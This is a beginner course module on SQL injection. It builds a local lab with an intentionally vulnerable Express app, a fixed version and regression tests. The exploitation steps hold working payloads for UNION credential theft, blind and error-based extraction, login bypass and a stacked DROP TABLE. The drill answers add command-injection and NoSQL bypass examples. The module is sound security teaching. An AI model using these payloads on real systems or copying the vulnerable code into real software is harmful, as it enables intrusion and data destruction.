# Week 6 — SQL Injection and Input Handling

> **Level:** Beginner · **Time:** ~10–12 h · **Tracking:** [issue #6](https://github.com/mascot200/cybersecurity-roadmap/issues/6)

## 🎯 Objectives

1. Explain *why* SQL injection happens (data interpreted as code) and why parameterized queries fix it.
2. Exploit classic, UNION-based, error-based and blind SQLi in a local lab and in PortSwigger labs.
3. Fix injection with parameterized queries, allowlists for identifiers and least-privilege DB roles.
4. Write regression tests that fail on vulnerable code and pass on fixed code.
5. Apply the same "data vs code" thinking to other injections (command, NoSQL, LDAP, template).

## 🌍 Why it matters

**Real-world scenarios:**
- **MOVEit Transfer (2023, CVE-2023-34362):** a SQL injection in a widely used file-transfer product was mass-exploited by a ransomware group; thousands of organizations had data stolen.
- **Heartland Payment Systems (2008):** SQL injection was the initial entry point for one of the largest card-data breaches of its era.
- SQLi has been known since the late 1990s and still appears every year — usually in code that builds queries with string concatenation "just this once".

---

## 📖 Concepts

### 1. The root cause

![SQL injection](images/sql-injection.svg)

The database receives **one string** and parses it. If user input is concatenated into that string,
the user can change the **structure** of the query, not just its values. Every injection bug —
SQL, OS command, LDAP, template — is the same pattern: **untrusted data crosses into an interpreter
as code.**

### 2. Types of SQL injection

| Type | How the attacker gets data | Example payload (in a string context) |
|---|---|---|
| **Tautology / auth bypass** | Make WHERE always true or cut off the password check | `' OR '1'='1` · `admin@lab.local' --` |
| **UNION-based** | Append a second SELECT whose rows appear in the response | `x' UNION SELECT id, email \|\| ':' \|\| password, 0 FROM users --` |
| **Error-based** | Database error messages leak data | `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int) --` |
| **Boolean blind** | Response differs for true vs false conditions | `kitchen' AND substring((SELECT password FROM users LIMIT 1),1,1)='A' --` |
| **Time-based blind** | Response delay reveals truth | `kitchen' AND (SELECT 1 FROM pg_sleep(3)) IS NOT NULL --` |
| **Second-order** | Payload stored safely, later used unsafely in another query | A username like `bob'--` used in a later report query |

UNION rules: the injected SELECT must return the **same number of columns** with **compatible
types**. Attackers find the column count with `ORDER BY 1`, `ORDER BY 2`… until an error.

### 3. The fix — parameterized queries (prepared statements)

```js
// ❌ Vulnerable
pool.query(`SELECT * FROM users WHERE email = '${email}'`);

// ✅ Parameterized (node-postgres uses $1, $2 …)
pool.query('SELECT * FROM users WHERE email = $1', [email]);
```

The query text and the values travel **separately**; the database parses the structure first, then
binds values that can never be parsed as SQL.

**What parameters can't do:** identifiers (table/column names), `ORDER BY` direction, `LIMIT` in some
drivers. For those, map user input to a **hard-coded allowlist**:

```js
const SORTABLE = { name: 'name', price: 'price_cents' };
const col = SORTABLE[req.query.sort] ?? 'name';   // user never controls the SQL text
```

**ORMs/query builders** (Prisma, Knex, Sequelize, TypeORM) parameterize by default — but all have
"raw" escape hatches (`$queryRawUnsafe`, `knex.raw` with interpolation, `sequelize.literal`). Those
are where SQLi hides in modern codebases.

### 4. Defense in depth

| Layer | Control |
|---|---|
| Code | Parameterized queries everywhere; allowlists for identifiers |
| Input | Validate type, length, format (`zod`/`joi`) — reduces attack surface but **is not** the fix |
| DB role | App user has only the privileges it needs; no superuser, no `COPY ... PROGRAM` |
| Errors | Generic errors to clients; DB errors only in logs |
| Detection | Alert on SQL syntax errors, WAF signatures, unusual query volume |
| Testing | Regression tests with injection payloads; SAST rules (Month 5) |

> **Escaping/blacklisting is not a fix.** Filters like "remove `'` and `--`" are bypassed with
> encodings, alternative comment syntax (`/* */`), or numeric contexts with no quotes at all
> (`?id=1 OR 1=1`).

### 5. Other injections — same pattern

| Injection | Vulnerable | Safer |
|---|---|---|
| OS command | `exec('convert ' + filename + ' out.png')` | `execFile('convert', [filename, 'out.png'])` — no shell |
| NoSQL (MongoDB) | `users.find({ email, password: req.body.password })` where password is `{"$ne": null}` | Validate types (`typeof password === 'string'`), schema validation |
| Template (SSTI) | Rendering user input *as a template* | Pass user input as template **data** only |
| Log injection | Writing raw user input with newlines into logs | Structured (JSON) logging |

---

## 🧪 Lab — Break it, fix it, prove it (4 h)

### Setup

```bash
docker run -d --name sqli-pg -e POSTGRES_PASSWORD=labpass -p 127.0.0.1:5432:5432 postgres:16
docker exec -i sqli-pg psql -U postgres -c "CREATE DATABASE sqli_lab"
mkdir -p ~/cybersecurity-journey/labs/sqli-lab && cd $_
npm init -y && npm pkg set type=module
npm i express pg && npm i -D vitest supertest
```

Create these files (they're tested: the fixed app passes 7/7; the vulnerable app fails the 5 attack tests).

`schema.sql`

```sql
DROP TABLE IF EXISTS products, users;
CREATE TABLE users (
  id serial PRIMARY KEY,
  email text UNIQUE NOT NULL,
  password text NOT NULL,          -- plaintext ON PURPOSE for this SQLi lab only; never do this
  is_admin boolean NOT NULL DEFAULT false
);
CREATE TABLE products (
  id serial PRIMARY KEY,
  name text NOT NULL,
  category text NOT NULL,
  price_cents int NOT NULL,
  released boolean NOT NULL DEFAULT true
);
INSERT INTO users (email, password, is_admin) VALUES
  ('admin@lab.local', 'Adm1n-Secret!', true),
  ('alice@lab.local', 'alice-password', false);
INSERT INTO products (name, category, price_cents, released) VALUES
  ('Red mug', 'kitchen', 1200, true),
  ('Blue mug', 'kitchen', 1300, true),
  ('Desk lamp', 'office', 4500, true),
  ('Prototype X (unreleased)', 'office', 99900, false);
```

`db.js`

```js
import pg from 'pg';
export const pool = new pg.Pool({
  connectionString: process.env.DATABASE_URL ?? 'postgresql://postgres:labpass@127.0.0.1:5432/sqli_lab',
});
```

`vulnerable.js`

```js
// ⚠️ INTENTIONALLY VULNERABLE — localhost lab only
import express from 'express';
import { pool } from './db.js';

export const app = express();
app.use(express.json());

// 1) Filter products by category — string concatenation
app.get('/products', async (req, res) => {
  const category = req.query.category ?? 'kitchen';
  const sql = `SELECT id, name, price_cents FROM products
               WHERE category = '${category}' AND released = true
               ORDER BY name`;
  try {
    const { rows } = await pool.query(sql);
    res.json(rows);
  } catch (e) {
    res.status(500).json({ error: e.message });       // also leaks DB errors (helps attackers)
  }
});

// 2) Login — concatenation lets an attacker skip the password check
app.post('/login', async (req, res) => {
  const { email, password } = req.body;
  const sql = `SELECT id, email, is_admin FROM users
               WHERE email = '${email}' AND password = '${password}'`;
  try {
    const { rows } = await pool.query(sql);
    if (rows.length === 0) return res.status(401).json({ error: 'Invalid credentials' });
    res.json({ loggedInAs: rows[0].email, isAdmin: rows[0].is_admin });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});
```

`fixed.js`

```js
import express from 'express';
import { pool } from './db.js';

export const app = express();
app.use(express.json({ limit: '10kb' }));

const CATEGORIES = new Set(['kitchen', 'office']);          // allowlist validation (defense in depth)
const SORTABLE = { name: 'name', price: 'price_cents' };    // identifiers can't be parameters → map

app.get('/products', async (req, res, next) => {
  try {
    const category = String(req.query.category ?? 'kitchen');
    if (!CATEGORIES.has(category)) return res.status(400).json({ error: 'Unknown category' });
    const sortCol = SORTABLE[req.query.sort] ?? 'name';
    const { rows } = await pool.query(
      `SELECT id, name, price_cents FROM products
       WHERE category = $1 AND released = true
       ORDER BY ${sortCol}`,          // safe: value comes from our own map, never from the user
      [category],
    );
    res.json(rows);
  } catch (e) { next(e); }
});

app.post('/login', async (req, res, next) => {
  try {
    const { email, password } = req.body ?? {};
    if (typeof email !== 'string' || typeof password !== 'string') {
      return res.status(400).json({ error: 'Invalid request' });
    }
    const { rows } = await pool.query(
      'SELECT id, email, is_admin, password FROM users WHERE email = $1',
      [email],
    );
    // (Plaintext comparison only because this lab's schema is about SQLi.
    //  Real apps: argon2.verify(row.pw_hash, password) — see Month 1 Week 4.)
    if (rows.length !== 1 || rows[0].password !== password) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }
    res.json({ loggedInAs: rows[0].email, isAdmin: rows[0].is_admin });
  } catch (e) { next(e); }
});

app.use((err, req, res, next) => {
  console.error(err);                                   // details stay server-side
  res.status(500).json({ error: 'Internal error' });
});
```

`sqli.test.js`

```js
import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import request from 'supertest';
import fs from 'node:fs';
import { pool } from './db.js';

const target = process.env.TARGET ?? 'fixed';            // TARGET=vulnerable to watch tests fail
const { app } = await import(`./${target}.js`);

beforeAll(async () => { await pool.query(fs.readFileSync('schema.sql', 'utf8')); });
afterAll(async () => { await pool.end(); });

describe(`SQL injection regression tests (${target})`, () => {
  it('returns released products for a valid category', async () => {
    const res = await request(app).get('/products').query({ category: 'kitchen' });
    expect(res.status).toBe(200);
    expect(res.body.map(p => p.name)).toEqual(['Blue mug', 'Red mug']);
  });

  it('does not leak unreleased products via OR-injection', async () => {
    const res = await request(app).get('/products').query({ category: "office' OR '1'='1' --" });
    const names = (Array.isArray(res.body) ? res.body : []).map(p => p.name);
    expect(names).not.toContain('Prototype X (unreleased)');
  });

  it('does not leak the users table via UNION injection', async () => {
    const payload = "x' UNION SELECT id, email || ':' || password, 0 FROM users --";
    const res = await request(app).get('/products').query({ category: payload });
    expect(JSON.stringify(res.body)).not.toContain('Adm1n-Secret!');
  });

  it('does not expose database error messages', async () => {
    const res = await request(app).get('/products').query({ category: "'" });
    expect(JSON.stringify(res.body)).not.toMatch(/syntax error|unterminated|postgres/i);
  });

  it('rejects login bypass with a comment payload', async () => {
    const res = await request(app).post('/login')
      .send({ email: "admin@lab.local' --", password: 'anything' });
    expect(res.status).not.toBe(200);
    expect(res.body.isAdmin).not.toBe(true);
  });

  it('rejects login bypass with a tautology', async () => {
    const res = await request(app).post('/login')
      .send({ email: 'admin@lab.local', password: "' OR '1'='1" });
    expect(res.status).not.toBe(200);
  });

  it('still allows a legitimate login', async () => {
    const res = await request(app).post('/login')
      .send({ email: 'alice@lab.local', password: 'alice-password' });
    expect(res.status).toBe(200);
    expect(res.body.loggedInAs).toBe('alice@lab.local');
  });
});
```

`serve.js` (run either app: `node serve.js vulnerable` or `node serve.js fixed`)

```js
const target = process.argv[2] ?? 'fixed';
const { app } = await import(`./${target}.js`);
app.listen(3002, '127.0.0.1', () => console.log(`${target} on http://127.0.0.1:3002`));
```

Load the schema:

```bash
docker exec -i sqli-pg psql -U postgres -d sqli_lab < schema.sql
```

### Step 1 — Run the regression tests against both versions

```bash
export DATABASE_URL=postgresql://postgres:labpass@127.0.0.1:5432/sqli_lab
TARGET=vulnerable npx vitest run    # expect: 5 failed | 2 passed  ← the bugs are real
npx vitest run                      # expect: 7 passed             ← the fix works
```

This is the core habit of this course: **a security fix is proven by a test that fails before and passes after.**

### Step 2 — Exploit the vulnerable app by hand

```bash
node serve.js vulnerable &
B=http://127.0.0.1:3002
```

Each payload below was run against this exact app. Predict the result *before* you run it.

**a) Normal request**
```bash
curl -s "$B/products?category=office"
# [{"id":3,"name":"Desk lamp","price_cents":4500}]
```

**b) Tautology: dump hidden rows**
```bash
curl -s -G "$B/products" --data-urlencode "category=office' OR '1'='1' --"
# ...includes "Prototype X (unreleased)"
```
Why does the unreleased product appear? Write out the final SQL string by hand.

**c) Count columns for a UNION**
```bash
for n in "NULL" "NULL,NULL" "NULL,NULL,NULL"; do
  curl -s -G "$B/products" --data-urlencode "category=x' UNION SELECT $n --"; echo
done
# 1 and 2 → "each UNION query must have the same number of columns"; 3 → success
```
> 💡 The classic `' ORDER BY 4 --` trick **fails here** with a syntax error. Why? `--` comments out
> only to the **end of the line**, and this query continues on a new line with its own `ORDER BY name`.
> Real exploitation is full of details like this. Read error messages carefully.

**d) UNION: steal the users table**
```bash
curl -s -G "$B/products" --data-urlencode "category=x' UNION SELECT id, email || ':' || password, 0 FROM users --"
# [{"id":1,"name":"admin@lab.local:Adm1n-Secret!",...}, ...]
```

**e) Error-based: data inside an error message**
```bash
curl -s -G "$B/products" --data-urlencode "category=' AND 1=CAST((SELECT password FROM users WHERE is_admin LIMIT 1) AS int) --"
# {"error":"invalid input syntax for type integer: \"Adm1n-Secret!\""}
```

**f) Boolean blind: one yes/no question at a time**
```bash
q="SELECT password FROM users WHERE is_admin LIMIT 1"
curl -s -G "$B/products" --data-urlencode "category=kitchen' AND substring(($q),1,1)='A' --"   # products → TRUE
curl -s -G "$B/products" --data-urlencode "category=kitchen' AND substring(($q),1,1)='B' --"   # []       → FALSE
```
Automating this character by character recovers the whole password — that's what tools like sqlmap do.

**g) Time-based blind**
```bash
time curl -s -o /dev/null -G "$B/products" --data-urlencode "category=kitchen' AND (SELECT 1 FROM pg_sleep(2)) IS NOT NULL --"
# real 0m2.0s
```

**h) Login bypass**
```bash
curl -s -H 'content-type: application/json' \
  -d "{\"email\":\"admin@lab.local' --\",\"password\":\"x\"}" $B/login
# {"loggedInAs":"admin@lab.local","isAdmin":true}
```

### Step 3 — Repeat against the fixed app

```bash
kill %1; node serve.js fixed &
curl -s -G "$B/products" --data-urlencode "category=x' UNION SELECT id, email || ':' || password, 0 FROM users --"
# {"error":"Unknown category"}
curl -s -G "$B/products?sort=price" --data-urlencode "category=office"
# [{"id":3,"name":"Desk lamp","price_cents":4500}]
kill %1
```

Then **remove the allowlist check** in `fixed.js` and rerun the tests. They should still pass, because
parameterization alone stops the injection. The allowlist is defense in depth.

### Step 4 — Least-privilege DB role (defense in depth)

```sql
CREATE ROLE shop_app LOGIN PASSWORD 'shop_app_pw';
GRANT CONNECT ON DATABASE sqli_lab TO shop_app;
GRANT SELECT ON products TO shop_app;
GRANT SELECT (id, email, password, is_admin) ON users TO shop_app;  -- ideally a separate auth service
```
node-postgres runs a query **without parameters** using PostgreSQL's simple protocol, which accepts
**multiple statements**. So stacked queries work against the vulnerable app. The payload has to leave
valid SQL behind for the text that follows the injection point (the `AND released = true` and the
`ORDER BY name` on the next line):

```bash
PAY="x'; DROP TABLE products; SELECT * FROM (SELECT 1 AS name, true AS released) t WHERE 'a'='a"

# as superuser (postgres)  → the products table is GONE
DATABASE_URL=postgresql://postgres:labpass@127.0.0.1:5432/sqli_lab node serve.js vulnerable &
curl -s -G "$B/products" --data-urlencode "category=$PAY"; kill %1

# recreate it, then as least-privilege role → {"error":"must be owner of table products"}
docker exec -i sqli-pg psql -U postgres -d sqli_lab < schema.sql   # re-run the GRANTs too
DATABASE_URL=postgresql://shop_app:shop_app_pw@127.0.0.1:5432/sqli_lab node serve.js vulnerable &
curl -s -G "$B/products" --data-urlencode "category=$PAY"; kill %1
```

The bug is identical in both runs. The **role** decides how much damage it can do. (Parameterized
queries use the extended protocol, which allows only one statement per query: one more reason to use them.)

### Step 5 — PortSwigger Web Security Academy

Complete the SQL injection **Apprentice** labs, then try at least two **Practitioner** labs (UNION
attack: determining columns, retrieving data; blind with conditional responses).
<https://portswigger.net/web-security/sql-injection>

---

## 📝 Assignment — Reproduce, fix, regression-test

**Task:** reproduce SQL injection in a local lab, fix it and add regression tests.

### Steps
1. Complete the lab above in `labs/sqli-lab/` of your journal.
2. **Add a new vulnerable feature yourself:** `GET /products/search?q=` using `ILIKE '%${q}%'` with
   concatenation. Exploit it (note the `%` wildcards change the payload shape).
3. Fix it with a parameter: `ILIKE $1` with `['%' + q + '%']`. Also escape `%` and `_` in `q` if
   literal matching matters (that's a correctness issue, not injection).
4. Add the `sort` parameter tests: `?sort=price;DROP TABLE users` must not reach SQL.
5. Write `labs/sqli-lab/README.md`:
   - vulnerability explanation (root cause in one sentence)
   - reproduction steps with payloads and outputs
   - the fix and *why it works*
   - test results before/after (paste vitest output)
   - which defense-in-depth layers you added

### Acceptance criteria
- [ ] Tests fail against `vulnerable.js` and pass against `fixed.js`
- [ ] New search endpoint: exploited, fixed, and tested
- [ ] Sort column via allowlist, with a test
- [ ] No DB error details returned to the client (tested)
- [ ] README explains root cause, fix and evidence
- [ ] PortSwigger SQLi Apprentice labs done

---

## 💼 On the job

- **Code review:** grep for template literals or `+` near `query(`, `raw(`, `$queryRawUnsafe`, `sequelize.query`. You'll automate this with Semgrep in Month 5.
- **Pentest finding write-up:** "SQL injection in `category` parameter allows extraction of all user credentials (CVSS 9.8)". Include the payload, the evidence and the fix.
- **Incident response:** web logs full of `UNION SELECT` / `pg_sleep` and a spike in 500s are classic signs.

## ⚠️ Common mistakes

- "We validate input on the frontend." Attackers skip the frontend.
- Escaping quotes by hand instead of parameterizing.
- Parameterizing values but interpolating `ORDER BY ${req.query.sort}`.
- Running the app as DB superuser.
- Fixing the one reported endpoint without searching for the same pattern elsewhere.

## 🥊 Drill (pass mark 8/10)

**1.** In one sentence, what is the root cause of all injection vulnerabilities?
<details><summary>Answer</summary>Untrusted data is sent to an interpreter as part of a command/query, so it can change the command's structure instead of being treated purely as data.</details>

**2.** Why do parameterized queries stop SQLi, while escaping is fragile?
<details><summary>Answer</summary>Parameters are sent separately from the query text and are bound after parsing, so they can never become SQL syntax. Escaping depends on handling every context and encoding correctly, and it's easy to miss one.</details>

**3.** Spot the bug: ``db.query(`SELECT * FROM orders WHERE id = ${req.params.id}`)``
<details><summary>Answer</summary>Numeric-context SQLi with no quotes needed (<code>1 OR 1=1</code>). Fix: <code>db.query('SELECT * FROM orders WHERE id = $1', [id])</code> plus integer validation, and an ownership check (that's IDOR, Month 3).</details>

**4.** How do you safely let users choose the sort column?
<details><summary>Answer</summary>Map user input to a hard-coded allowlist of column names; never interpolate the raw value.</details>

**5.** What's required for a UNION-based injection to work?
<details><summary>Answer</summary>The injected SELECT must have the same number of columns as the original, with compatible types, and the results must be reflected in the response.</details>

**6.** The page shows no data and no errors, but responses take 5 s when you inject `pg_sleep(5)`. What type of SQLi is this?
<details><summary>Answer</summary>Time-based blind SQL injection.</details>

**7.** Spot the bug (MongoDB): `User.findOne({ email: req.body.email, password: req.body.password })`
<details><summary>Answer</summary>NoSQL operator injection: sending <code>{"password": {"$ne": null}}</code> matches any password. Validate that inputs are strings (schema validation), and compare password hashes in code.</details>

**8.** Spot the bug: ``exec(`ping -c 1 ${host}`)``
<details><summary>Answer</summary>OS command injection (<code>host=8.8.8.8; cat /etc/passwd</code>). Use <code>execFile('ping', ['-c', '1', host])</code>, which doesn't use a shell, and validate the host format.</details>

**9.** Why does a least-privilege DB role matter if the code is parameterized?
<details><summary>Answer</summary>Defense in depth: it limits damage from any missed injection, leaked credentials or compromised app server.</details>

**10.** Scenario: you find SQLi in production during a code review. What do you do (in order)?
<details><summary>Answer</summary>Report it privately to the owner/security team; assess exploitability and whether it's been exploited (check logs); fix with parameterization plus a regression test; search for the same pattern elsewhere; deploy; consider credential rotation and notification if data may have been accessed; record lessons learned.</details>

## ✅ Checklist
- [ ] Lab steps 1–5
- [ ] Assignment acceptance criteria met
- [ ] Drill ≥ 8/10, weekly log on issue #6

## 📚 Resources
- PortSwigger SQL injection — <https://portswigger.net/web-security/sql-injection>
- OWASP SQL Injection Prevention Cheat Sheet — <https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html>
- OWASP Injection Prevention Cheat Sheet — <https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html>
- node-postgres queries — <https://node-postgres.com/features/queries>

---
[← Week 5](week-05-owasp-misconfiguration.md) · [Next: Week 7 — Browser security →](week-07-browser-security.md)
